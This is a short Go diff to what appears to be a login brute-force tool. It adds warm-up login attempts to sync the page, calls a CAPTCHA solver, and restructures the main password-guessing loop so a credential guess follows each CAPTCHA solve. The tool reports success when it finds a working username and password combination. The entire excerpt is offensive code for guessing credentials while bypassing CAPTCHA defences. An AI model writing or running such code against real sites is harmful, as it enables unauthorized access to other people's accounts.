@@ -51,6 +51,12 @@ func main() {
 		fmt.Println("Error when parsing file to slice: ", err)
 		return
 	}
+	//making sure i start on login page
+	for i := 0; i < 3; i++ {
+		brute.Orca(u, "a", "a")
+	}
+	captcha.Solver(u)
+	fmt.Println("Page should be synced for loop")
 
 	//main bruteloop
 
@@ -63,7 +69,8 @@ func main() {
 				captcha.Solver(u)
 				counter = 0
 
-			} else if brute.Orca(u, v, k) {
+			}
+			if brute.Orca(u, v, k) {
 				fmt.Println("Done! Found combination:  ", v, ":", k)
 				return
 			}
